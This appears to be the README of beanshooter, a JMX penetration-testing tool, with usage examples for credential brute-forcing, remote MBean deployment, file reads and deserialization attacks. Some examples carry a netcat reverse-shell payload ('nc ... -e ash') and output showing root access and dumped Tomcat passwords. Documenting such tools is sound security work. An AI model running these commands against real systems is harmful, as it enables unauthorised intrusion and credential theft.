### beanshooter

----

*beanshooter* is a *JMX* enumeration and attacking tool, which helps to identify common vulnerabilities on *JMX* endpoints.

![](https://github.com/qtc-de/beanshooter/workflows/master%20maven%20CI/badge.svg?branch=master)
![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
![](https://img.shields.io/badge/java-8%2b-blue)
[![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
[![](https://img.shields.io/badge/version-3.0.0-blue)](https://github.com/qtc-de/beanshooter/releases)
[![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/beanshooter/blob/master/LICENSE)


https://user-images.githubusercontent.com/49147108/183278179-4a5566a7-5af8-4ce8-a73d-1016876a36d5.mp4


### Installation

-----

*beanshooter* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
installed, just execute the following commands to create an executable ``.jar`` file:

```console
[qtc@devbox ~]$ git clone https://github.com/qtc-de/beanshooter
[qtc@devbox ~]$ cd beanshooter
[qtc@devbox ~]$ mvn package
```

You can also use prebuild packages that are created for [each release](https://github.com/qtc-de/beanshooter/releases).
Prebuild packages for the development branch are created automatically and can be found on the *GitHub*
[actions page](https://github.com/qtc-de/beanshooter/actions).

*beanshooter* does not include *ysoserial* as a dependency. To enable *ysoserial* support, you need either specify the path
to your ``ysoserial.jar`` file as additional argument (e.g. ``--yso /opt/ysoserial.jar``) or you change the
default path within the [beanshooter configuration file](./beanshooter/config.properties) before building the project.

*beanshooter* supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](/resources/bash_completion.d/beanshooter) to your ``~/.bash_completion.d`` folder enables
autocompletion.

```console
[qtc@devbox ~]$ cp resources/bash_completion.d/beanshooter ~/bash_completion.d/
```


### Table of Contents

----

- [Supported Operations](#supported-operations)
  + [Basic Operations](#basic-operations)
    - [attr](#attr)
    - [brute](#brute)
    - [deploy](#deploy)
    - [enum](#enum)
    - [info](#info)
    - [invoke](#invoke)
    - [list](#list)
    - [serial](#serial)
    - [stager](#stager)
    - [undeploy](#undeploy)
  + [MBean Operations](#mbean-operations)
    - [generic](#generic-mbean-operations)
      + [attr](#generic-attr)
      + [info](#generic-info)
      + [invoke](#generic-invoke)
      + [stats](#generic-stats)
      + [status](#generic-status)
      + [export](#generic-export)
      + [deploy](#generic-deploy)
      + [undeploy](#generic-undeploy)
    - [diagnostic](#diagnostic)
      + [read](#diagnostic-read)
      + [load](#diagnostic-load)
      + [logfile](#diagnostic-logfile)
      + [nolog](#diagnostic-nolog)
      + [cmdline](#diagnostic-cmdline)
      + [props](#diagnostic-props)
    - [hotspot](#hotspot)
      + [dump](#hotspot-dump)
      + [list](#hotspot-list)
      + [get](#hotspot-get)
      + [set](#hotspot-set)
    - [mlet](#mlet)
      + [load](#mlet-load)
    - [recorder](#recorder)
      + [new](#recorder-new)
      + [start](#recorder-start)
      + [stop](#recorder-stop)
      + [read](#recorder-read)
      + [dump](#recorder-dump)
    - [tomcat](#tomcat)
      + [dump](#tomcat-dump)
      + [list](#tomcat-list)
      + [write](#tomcat-write)
    - [tonka](#tonka)
      + [exec](#tonka-exec)
      + [execarray](#tonka-execarray)
      + [shell](#tonka-shell)
      + [upload](#tonka-upload)
      + [download](#tonka-download)
- [JMXMP](#jmxmp)
- [Example Server](#example-server)


### Supported Operations

-----

The different *beanshooter* operations can be divided into two groups: *basic operations* and *MBean operations*. Whereas
*basic operations* are used to perform general operations on a *JMX* endpoint, *MBean operations* target a specific *MBean*
to interact with. For more details, check the usage examples in the following sections.

```console
[qtc@devbox ~]$ beanshooter -h
usage: beanshooter [-h]   ...

beanshooter v3.0.0 - a JMX enumeration and attacking tool

positional arguments:

 Basic Operations
    attr                 set or get MBean attributes
    brute                bruteforce JMX credentials
    deploy               deploys the specified MBean on the JMX server
    enum                 enumerate the JMX service for common vulnerabilities
    info                 display method and attribute information on an MBean
    invoke               invoke the specified method on the specified MBean
    list                 list available MBEans on the remote MBean server
    serial               perform a deserialization attack
    stager               start a stager server to deliver MBeans
    undeploy             undeploys the specified MBEAN from the JMX server

 MBean Operations
    diagnostic           Diagnostic Command MBean
    hotspot              HotSpot Diagnostic MBean
    mlet                 default JMX bean that can be used to load additional beans dynamically
    recorder             jfr Flight Recorder MBean
    tomcat               tomcat MemoryUserDatabaseMBean used for user management
    tonka                general purpose bean for executing commands and uploading or download files

named arguments:
  -h, --help             show this help message and exit
```


### Basic Operations

---

Basic operations are general purpose operations that can be performed on a JMX service. These are usually
operations that do not target a specific MBean or that target an MBean with no builtin support by beanshooter.

#### Attr

The `attr` action can be used to get or set attributes on a specified *MBean*. To obtain available attributes,
the `info` action should be used:

```console
[qtc@devbox ~]$ beanshooter info 172.17.0.2 9010
...
[+] MBean Class: sun.management.MemoryImpl
[+] ObjectName: java.lang:type=Memory
[+]
[+]     Attributes:
[+]         Verbose (type: boolean , writable: true)
[+]         ObjectPendingFinalizationCount (type: int , writable: false)
[+]         HeapMemoryUsage (type: javax.management.openmbean.CompositeData , writable: false)
[+]         NonHeapMemoryUsage (type: javax.management.openmbean.CompositeData , writable: false)
[+]         ObjectName (type: javax.management.ObjectName , writable: false)
[+]
[+]     Operations:
[+]         void gc()
```

When just the attribute name is specified, *beanshooter* obtains and displays the current attribute value:

```console
[qtc@devbox ~]$ beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose
false
```

When an additional value is specified, *beanshooter* attempts to set the corresponding attribute. For attributes
that have a different type than *String*, specifying the attribute type using the `--type` option is required:

```console
[qtc@devbox ~]$ beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean
[qtc@devbox ~]$ beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose
true
```

#### Brute

The `brute` action performs a bruteforce attack on a password protected *JMX* service. When running with no additional
optional arguments, *beanshooter* users a builtin wordlist with a few common username-password combinations. For more
dedicated attacks you should use the `--username-file` and `--password-file` options to specify more exhaustive wordlists.

```console
[qtc@devbox ~]$ beanshooter brute 172.17.0.2 1090
[+] Reading wordlists for the brute action.
[+] 	Reading credentials from internal wordlist.
[+]
[+] Starting bruteforce attack with 10 credentials.
[+]
[+] 	Found valid credentials: admin:admin
[+] 	[10 / 10] [########################################] 100%
[+]
[+] done.
```

#### Deploy

The `deploy` action can be used to deploy an *MBean* on a *JMX* service. This action **should not** be used to deploy *MBeans* with
default support like e.g. the *TonkaBean*. Deploying *MBeans* with default support should be done through the corresponding
[MBean operations](#mbean-operations).

When the *MBean* you want to deploy is already known to the *JMX* service, it is sufficient to specify the class name of the implementing
*MBean* class and the desired `ObjectName`:

```console
[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 javax.management.monitor.StringMonitor qtc.test:type=Monitor
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: StringMonitor
[+] 	MBean with object name qtc.test:type=Monitor was successfully deployed.
```

When the *MBean* class is not known to the *JMX* service, you can use the `--jar-file` and `--stager-url` options to provide an implementation:

```console
[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: ExampleBean
[+]
[+] 		MBean class is not known to the server.
[+] 		Starting MBean deployment.
[+]
[+] 			Deplyoing MBean: MLet
[+] 			MBean with object name DefaultDomain:type=MLet was successfully deployed.
[+]
[+] 		Loading MBean from http://172.17.0.1:8000
[+]
[+] 			Creating HTTP server on: 172.17.0.1:8000
[+] 				Creating MLetHandler for endpoint: /
[+] 				Creating JarHandler for endpoint: /c65c3cdc908348d8bd9a22b8a2bf8be3
[+] 				Starting HTTP server... 
[+] 				
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /
[+] 			Sending mlet:
[+]
[+] 				Class:     non.existing.example.ExampleBean
[+] 				Archive:   c65c3cdc908348d8bd9a22b8a2bf8be3
[+] 				Object:    qtc.test:type=Example
[+] 				Codebase:  http://172.17.0.1:8000
[+]
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /c65c3cdc908348d8bd9a22b8a2bf8be3
[+] 			Sending jar file with md5sum: c4d8f40d1c1ac7f3cf7582092802a484
[+]
[+] 	MBean with object name qtc.test:type=Example was successfully deployed.
```

#### Enum

The `enum` action enumerates some configuration details on a *JMX* endpoint. It always checks whether the
*JMX* endpoints requires authentication and whether it allows pre authenticated arbitrary deserialization.

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 1090
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server requires authentication.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer accepted the payload class.
[+] 	  Configuration Status: Non Default
```

When authentication is not required, or when valid credentials were specified, the `enum` action also attempts to
enumerate some further information from the *JMX* endpoint. This includes a list of non default *MBeans* and
e.g. the user accounts registered on a *Apache tomcat* server:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 1090
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server does not require authentication.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer rejected the payload class.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+] 	- 57 MBeans are currently registred on the MBean server.
[+] 	  Listing 39 non default MBeans:
[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=AccessLogValve)
[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=GlobalRequestProcessor,name="http-nio-8080")
[...]
[+]
[+] Enumerating tomcat users:
[+]
[+] 	- Listing 3 tomcat users:
[+]
[+] 		----------------------------------------
[+] 		Username:  manager
[+] 		Password:  P@55w0rD#
[+] 		Roles:
[+] 			   Users:type=Role,rolename="manager-gui",database=UserDatabase
[+] 			   Users:type=Role,rolename="manager-script",database=UserDatabase
[+] 			   Users:type=Role,rolename="manager-jmx",database=UserDatabase
[+] 			   Users:type=Role,rolename="manager-status",database=UserDatabase
[+]
[+] 		----------------------------------------
[+] 		Username:  admin
[+] 		Password:  s3cr3T!$
[+] 		Roles:
[+] 			   Users:type=Role,rolename="admin-gui",database=UserDatabase
[+] 			   Users:type=Role,rolename="admin-script",database=UserDatabase
[...]
```

When invoking the `enum` action on a *SASL* protected endpoint, *beanshooter* attempts to enumerate the *SASL* profile
that is configured for the server. This is only possible to a certain extend and the *TLS* configuration of the server
cannot be enumerated. If the *SASL* profile identified by *beanshooter* does not work, you should always retry with/without
the `--ssl` option:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 4447 --jmxmp
[+] Checking servers SASL configuration:
[+]
[+] 	- Remote JMXMP server uses SASL/DIGEST-MD5 SASL profile.
[+] 	  Credentials are requried and the following hostname must be used: iinsecure.dev
[+] 	  Notice: TLS setting cannot be enumerated and --ssl may be required.
[+] 	  Vulnerability Status: Non Vulnerable
...
```

#### Info

The `info` action can be used to obtain method and attribute information of *MBeans* that are available on the *MBean server*.
When invoked without additional arguments, method and attribute information of all available *MBeans* is printed. When specifying
an additional *ObjectName*, only method and attribute information of the specified *MBean* is printed:

```console
[qtc@devbox ~]$ beanshooter info 172.17.0.2 9010 java.lang:type=Memory
[+] MBean Class: sun.management.MemoryImpl
[+] ObjectName: java.lang:type=Memory
[+]
[+] 	Attributes:
[+] 		Verbose (type: boolean , writable: true)
[+] 		ObjectPendingFinalizationCount (type: int , writable: false)
[+] 		HeapMemoryUsage (type: javax.management.openmbean.CompositeData , writable: false)
[+] 		NonHeapMemoryUsage (type: javax.management.openmbean.CompositeData , writable: false)
[+] 		ObjectName (type: javax.management.ObjectName , writable: false)
[+]
[+] 	Operations:
[+] 		void gc()
```

#### Invoke

The `invoke` action can be used to invoke an arbitrary method on an *MBean* that has already been deployed on a *JMX* endpoint.
Apart from the endpoint, the `invoke` action requires the `ObjectName` of the targeted *MBean* and the method signature you
want to invoke. If the specified method expects arguments, these also have to be specified. The following listing shows an example,
of an argumentless method invocation, where the `vmVersion()` method from the `DiagnosticCommand` *MBean* is invoked:

```console
[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'
OpenJDK 64-Bit Server VM version 11.0.14.1+1
JDK 11.0.14.1
```

When invoking a method that requires parameters, the specified *beanshooter* arguments are evaluated as *Java code*. Simple argument
types like integers or strings can just be passed by specifying their corresponding value. Complex argument types can be constructed
as you would do it in *Java* (e.g. `'new java.util.HashMap()'`). The following listing shows an example, where the `help(String[] args)`
method is invoked on the `DiagnosticCommand` *MBean*:

```console
[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'help(String[] args)' 'new String[] { "Compiler.directives_add" }'
Compiler.directives_add
Add compiler directives from file.

Impact: Low

Permission: java.lang.management.ManagementPermission(monitor)

Syntax : Compiler.directives_add  <filename>

Arguments:
    filename :  Name of the directives file (STRING, no default value)
```

For more complex argument types that require some initialization, you can use *beanshooters PluginSystem* and define a custom
class that implements the [IArgumentProvider Interface](beanshooter/src/de/qtc/beanshooter/plugin/IArgumentProvider.java).

#### List

The `list` action prints a list of all registered *MBeans* on the remote *JMX* service:

```console
[qtc@devbox ~]$ beanshooter list 172.17.0.2 9010
[+] Available MBeans:
[+]
[+] 	- sun.management.MemoryManagerImpl (java.lang:name=Metaspace Manager,type=MemoryManager)
[+] 	- sun.management.MemoryPoolImpl (java.lang:name=Metaspace,type=MemoryPool)
[+] 	- javax.management.MBeanServerDelegate (JMImplementation:type=MBeanServerDelegate)
[...]
```

#### Serial

The `serial` action can be used to perform deserialization attacks on a *JMX* endpoint. By default, the action
attempts post authenticated deserialization attacks. For this to work, you target *JMX* service needs either to
allow unauthenticated access or you need valid credentials:

```console
[qtc@devbox ~]$ beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin
[+] Attemting deserialization attack on JMX endpoint.
[+]
[+] 	Creating ysoserial payload... done.
[+] 	MBeanServer attempted to deserialize the DeserializationCanary class.
[+] 	Deserialization attack was probably successful.

[qtc@devbox ~]$ nc -vlp 4444
[...]
id
uid=0(root) gid=0(root) groups=0(root)
```

*JMX* services can also be vulnerable to pre authenticated deserialization attacks. To abuse this, you can use the `--preauth` switch:

```console
[qtc@devbox ~]$ beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --preauth
[+] Attemting deserialization attack on JMX endpoint.
[+]
[+] 	Creating ysoserial payload... done.
[+] 	MBeanServer attempted to deserialize the DeserializationCanary class.
[+] 	Deserialization attack was probably successful.

[qtc@devbox ~]$ nc -vlp 4444
[...]
id
uid=0(root) gid=0(root) groups=0(root)
```

Against *JMXMP* endpoints, preauthenticated deserialization is usually possible. Unfortunately, there is no way to enumerate this properly
during the `enum` action. If you encounter a *JMXMP* endpoint, you should just give it a try.

#### Stager

The `stager` action starts a stager server that can be used to deliver *MBeans*. Creating a stager server
for *MBean* delivery is normally done automatically when using *beanshooters* `deploy` action. However,
sometimes it is required to use a standalone server. When using the `stager` action, you can either specify
the name of a builtin *MBean* to deliver (e.g. `tonka`) or the `custom` keyword. If `custom` was specified,
the `--class-name`, `--object-name` and `--jar-file` options are required.

```console
[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8888 --no-stager
[qtc@devbox ~]$ beanshooter stager 172.17.0.1 8888 tonka
[+] Creating HTTP server on: 172.17.0.1:8888
[+] Creating MLetHandler for endpoint: /
[+] Creating JarHandler for endpoint: /93691b8bae4143f087f7a3123641b20d
[+] Starting HTTP server.
[+] 
[+] Press Enter to stop listening.
[+]
[+] Incoming request from: iinsecure.dev
[+] Requested resource: /
[+] Sending mlet:
[+]
[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+] 	Archive:   93691b8bae4143f087f7a3123641b20d
[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
[+] 	Codebase:  http://172.17.0.1:8888
[+]
[+] Incoming request from: iinsecure.dev
[+] Requested resource: /93691b8bae4143f087f7a3123641b20d
[+] Sending jar file with md5sum: 6568ffb2934cb978dbd141848b8b128a
```

#### Undeploy

The `undeploy` action removes the *MBean* with the specified `ObjectName` from the *JMX* service:

```console
[qtc@devbox ~]$ beanshooter undeploy 172.17.0.2 9010 qtc.test:type=Example 
[+] Removing MBean with ObjectName qtc.test:type=Example from the MBeanServer.
[+] MBean was successfully removed.
```


### MBean Operations

---

In contrast to [basic operations](#basic-operations) that target the general functionality exposed by a *JMX*
endpoint, *MBean operations* target a specific *MBean*. For each supported *MBean*, *beanshooter* provides
another subparser containing the available operations and options for the corresponding *MBean*. The following
listing shows an example for the `mlet` *MBean* and the associated subparser:

```console
[qtc@devbox ~]$ beanshooter mlet -h
usage: beanshooter mlet [-h]   ...

positional arguments:

    load                 load a new MBean from the specified URL
    attr                 set or get MBean attributes
    deploy               deploys the specified MBean on the JMX server
    info                 print server information about the MBean
    invoke               invoke the specified method on the MBean
    stats                print local information about the MBean
    status               checks whether the MBean is registered
    undeploy             undeploys the specified MBEAN from the JMX server

named arguments:
  -h, --help             show this help message and exit
```


### Generic MBean Operations

---

Some *beanshooter* operations are available for each *MBean* and are demonstrated in this section.
These generic *MBean* operations often mirror functionality from the [basic operations](#basic-operations),
but without the requirement of specifying an *ObjectName*.

#### Generic Attr

The `attr` action works the same as the `attr` action from the basic operations. However, the *ObjectName*
does no longer need to be specified, as it is contained within the specified *MBean*.

```console
[qtc@devbox ~]$ beanshooter tomcat attr 172.17.0.2 1090 users
Users:type=User,username="manager",database=UserDatabase
Users:type=User,username="admin",database=UserDatabase
Users:type=User,username="status",database=UserDatabase
```

#### Generic Deploy

The `deploy` action works basically like the `deploy` action from the [basic operations](#basic-operations).
However, since the class name, `ObjectName` and the implementing jar file are all already associated with
the specified *MBean*, you only need to specify the `--stager-url` option with this action (assuming that
a builtin jar file is available):

```console
[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8000
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: TonkaBean
[+]
[+] 		MBean class is not known to the server.
[+] 		Loading MBean from http://172.17.0.1:8000
[+]
[+] 			Creating HTTP server on: 172.17.0.1:8000
[+] 				Creating MLetHandler for endpoint: /
[+] 				Creating JarHandler for endpoint: /440441bf8c794d40a83caf1e34cd9993
[+] 				Starting HTTP server... 
[+] 				
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /
[+] 			Sending mlet:
[+]
[+] 				Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+] 				Archive:   440441bf8c794d40a83caf1e34cd9993
[+] 				Object:    MLetTonkaBean:name=TonkaBean,id=1
[+] 				Codebase:  http://172.17.0.1:8000
[+]
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /440441bf8c794d40a83caf1e34cd9993
[+] 			Sending jar file with md5sum: 55a843002e13f763137d115ce4caf705
[+]
[+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed
```

#### Generic Export

Sometimes it is not possible to serve an *MBean* implementation using *beanshooters* stager server. A common
scenario is that outbound connections to your local machine are blocked. In these situations, you may want
to load the *MBean* from another location, like an *SMB* service in the internal network where you have write
access to.

The `export` action exports the *jar* file implementing the specified *MBean* and a corresponding *MLet HTML*
document that is required for loading the *MBean* using *MLet*. Assuming you want to serve the *TonkaBean*
form an *SMB* service listening on `10.10.10.5`, you could use the following command:

```console
[qtc@devbox ~]$ beanshooter tonka export --export-dir export --stager-url file:////10.10.10.5/share/
[+] Exporting MBean jar file: export/tonka-bean-3.0.0-jar-with-dependencies.jar
[+] Exporting MLet HTML file to: export/index.html
[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+] 	Archive:   tonka-bean-3.0.0-jar-with-dependencies.jar
[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
[+] 	Codebase:  file:////10.10.10.5/share/
```

Afterwards, you can upload the exported *jar* and the `index.html` file to the *SMB* service and use the *beanshooters*
deploy action with the `--stager-url file:////10.10.10.5/share/index.html` option.

#### Generic Info

The `info` action lists method and attribute information of the specified *MBean*:

```console
[qtc@devbox ~]$ beanshooter tomcat info 172.17.0.2 1090
[+] MBean Class: org.apache.catalina.mbeans.MemoryUserDatabaseMBean
[+] ObjectName: Users:type=UserDatabase,database=UserDatabase
[+]
[+] 	Attributes:
[+] 		modelerType (type: java.lang.String , writable: false)
[+] 		readonly (type: boolean , writable: false)
[+] 		roles (type: [Ljava.lang.String; , writable: false)
[+] 		groups (type: [Ljava.lang.String; , writable: false)
[+] 		users (type: [Ljava.lang.String; , writable: false)
[+] 		pathname (type: java.lang.String , writable: true)
[+] 		writable (type: null , writable: false)
[+]
[+] 	Operations:
[+] 		java.lang.String findGroup(java.lang.String groupname)
[+] 		java.lang.String createUser(java.lang.String username, java.lang.String password, java.lang.String fullName)
[+] 		void removeGroup(java.lang.String groupname)
[+] 		void removeUser(java.lang.String username)
[+] 		void save()
[+] 		java.lang.String findRole(java.lang.String rolename)
[+] 		void removeRole(java.lang.String rolename)
[+] 		java.lang.String createGroup(java.lang.String groupname, java.lang.String description)
[+] 		java.lang.String findUser(java.lang.String username)
[+] 		java.lang.String createRole(java.lang.String rolename, java.lang.String description)
```

#### Generic Invoke

The `invoke` action can be used to invoke an arbitrary method on the specified *MBean*:

```console
[qtc@devbox ~]$ beanshooter tomcat invoke 172.17.0.2 1090 --signature 'findUser(String username)' admin
Users:type=User,username="admin",database=UserDatabase
```

#### Generic Stats

The `stats` action lists some general information on the specified *MBean*. This is the information
that *beanshooters* locally stores on the corresponding *MBean* and no server interaction is required.

```console
[qtc@devbox ~]$ beanshooter tonka stats
[+] MBean: tonka
[+] 	Object Name: 	 MLetTonkaBean:name=TonkaBean,id=1
[+] 	Class Name: 	 de.qtc.beanshooter.tonkabean.TonkaBean
[+] 	Jar File: 	     available (tonka-bean-3.0.0-jar-with-dependencies.jar)
```

The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
option. Currently, the *TonkaBean* is the only *MBean* that has a *Jar File* available.

#### Generic Status

The `status` action checks whether the corresponding *MBean* is already available on the *JMX* service:

```console
[qtc@devbox ~]$ beanshooter tonka status 172.17.0.2 9010
[+] MBean Status: not deployed
```

#### Generic Undeploy

The undeploy action removes the specified *MBean* from a remote *JMX* service:

```console
[qtc@devbox ~]$ beanshooter tonka undeploy 172.17.0.2 9010 
[+] Removing MBean with ObjectName MLetTonkaBean:name=TonkaBean,id=1 from the MBeanServer.
[+] MBean was successfully removed.
```


### Diagnostic

---

The *DiagnosticCommandMBean* is a useful *MBean* that is ofted deployed by default on *JMX servers*.
It implements several different methods that are interesting from an offensive perspective. Some of
them are implemented as *beanshooter* operations. Others can of course be invoked manually.

#### Diagnostic Read

The `read` operation can be used to read textfiles on the *MBean* server. The operation uses the
`addCompilerDirective` method to cause an exception that contains the contents of the specified
text file:

```console
[qtc@devbox ~]$ beanshooter diagnostic read 172.17.0.2 1090 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

This technique was originally implemented by [@TheLaluka](https://twitter.com/TheLaluka) within the
[jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit).

#### Diagnostic Load

The `load` operation can be used to load a shared library from the file system of the *JMX server*:

```console
[qtc@devbox ~]$ beanshooter diagnostic load 172.17.0.2 1090 /lib/x86_64-linux-gnu/libc.so.6
[+] The server complained about the missing function Agent_OnAttach
[+] The specified library was loaded succesfully.
```

#### Diagnostic Logfile

The `logfile` action can be used to change the logfile location of the *JVM*:

```console
[qtc@devbox ~]$ beanshooter diagnostic logfile 172.17.0.2 1090 /tmp/test.log
[+] Logfile path was successfully set to /tmp/test.log
```

#### Diagnostic Nolog

The `nolog` action can be used to disable logging (useful to close the logfile handle):

```console
[qtc@devbox ~]$ beanshooter diagnostic nolog 172.17.0.2 1090
[+] Logging was disabled successfully.
```

#### Diagnostic Cmdline

The `cmdline` action prints the cmdline the *JVM* was launched with:

```console
[qtc@devbox ~]$ beanshooter diagnostic cmdline 172.17.0.2 1090
VM Arguments:
jvm_args: --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp -Djava.rmi.server.hostname=iinsecure.dev -Djavax.net.ssl.keyStorePassword=password -Djavax.net.ssl.keyStore=/opt/store.p12 -Djavax.net.ssl.keyStoreType=pkcs12 -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.local.only=false -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.port=1090 -Dcom.sun.management.jmxremote.rmi.port=1099
java_command: org.apache.catalina.startup.Bootstrap start
java_class_path (initial): /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar
Launcher Type: SUN_STANDARD
```

#### Diagnostic Props

The `props` action prints a list of system properties:

```console
[qtc@devbox ~]$ beanshooter diagnostic props 172.17.0.2 1090
#Mon Jul 25 19:17:52 UTC 2022
com.sun.management.jmxremote.rmi.port=1099
awt.toolkit=sun.awt.X11.XToolkit
java.specification.version=11
sun.cpu.isalist=
...
```


### HotSpot

---

The *HotSpotDiagnosticMXBean* provides an interface for managing the *HotSpot Virtual Machine*
and supports some methods that are useful from an offensive perspective.

#### HotSpot dump

The `dump` action creates a heapdump and saves it to an arbitrary location on the application server.
The only requirement is, that the dump is saved as a file with the `.hprof` extension:

```console
[qtc@devbox ~]$ beanshooter hotspot dump 172.17.0.2 1090 /tmp/dump.hprof
[+] Heapdump file /tmp/dump.hprof was created successfully.
```

#### HotSpot list

The `list` action prints a list of available *Diagnostic Options* and their associated values:

```console
[qtc@devbox ~]$ beanshooter hotspot list 172.17.0.2 1090
[+] HeapDumpBeforeFullGC (value = false, writable = true)
[+] HeapDumpAfterFullGC (value = false, writable = true)
[+] HeapDumpOnOutOfMemoryError (value = false, writable = true)
[+] HeapDumpPath (value = , writable = true)
...
```

#### HotSpot get

The `get` action allows to obtain the value of the specified option:

```console
[qtc@devbox ~]$ beanshooter hotspot get 172.17.0.2 1090 HeapDumpBeforeFullGC
[+] Name: HeapDumpBeforeFullGC
[+] Value: false
[+] Writable: true
```

#### HotSpot set

The `set` action allows to set the value of the specified option:

```console
[qtc@devbox ~]$ beanshooter hotspot set 172.17.0.2 1090 HeapDumpBeforeFullGC true
[+] Option was set successfully.
[qtc@devbox ~]$ beanshooter hotspot get 172.17.0.2 1090 HeapDumpBeforeFullGC
[+] Name: HeapDumpBeforeFullGC
[+] Value: true
[+] Writable: true
```


### MLet

---

The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
network. It is already implicitly used by *beanshooters* `deploy` action, but can also be invoked
manually using the `mlet` operation.

#### MLet Load

The currently only implemented *MLet* method is the `load` operation that can be used to load
an *MBean* class from a user specified *URL*:

```console
[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: MLet
[+] 	MBean with object name DefaultDomain:type=MLet was successfully deployed.
[+]
[+] Loading MBean from http://172.17.0.1:8000
[+]
[+] 	Creating HTTP server on: 172.17.0.1:8000
[+] 		Creating MLetHandler for endpoint: /
[+] 		Creating JarHandler for endpoint: /3584de270132420aaf0812366bc46035
[+] 		Starting HTTP server... 
[+] 		
[+] 	Incoming request from: iinsecure.dev
[+] 	Requested resource: /
[+] 	Sending mlet:
[+]
[+] 		Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+] 		Archive:   3584de270132420aaf0812366bc46035
[+] 		Object:    MLetTonkaBean:name=TonkaBean,id=1
[+] 		Codebase:  http://172.17.0.1:8000
[+]
[+] 	Incoming request from: iinsecure.dev
[+] 	Requested resource: /3584de270132420aaf0812366bc46035
[+] 	Sending jar file with md5sum: b2f7040f7d8f2d1f40b205d631ff7356
[+]
[+] MBean was loaded successfully.
```

The example above demonstrates how the *TonkaBean* can be manually loaded using the `mlet` operation. If
you want to load a custom *MBean* instead, you need to specify the keyword `custom` instead of `tonka` and supply
the `--class-name`, `--object-name` and `--jar-file` options:

```console
[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
[+] Starting MBean deployment.
[+] ...
[+] MBean was loaded successfully.
```


### Recoder

---

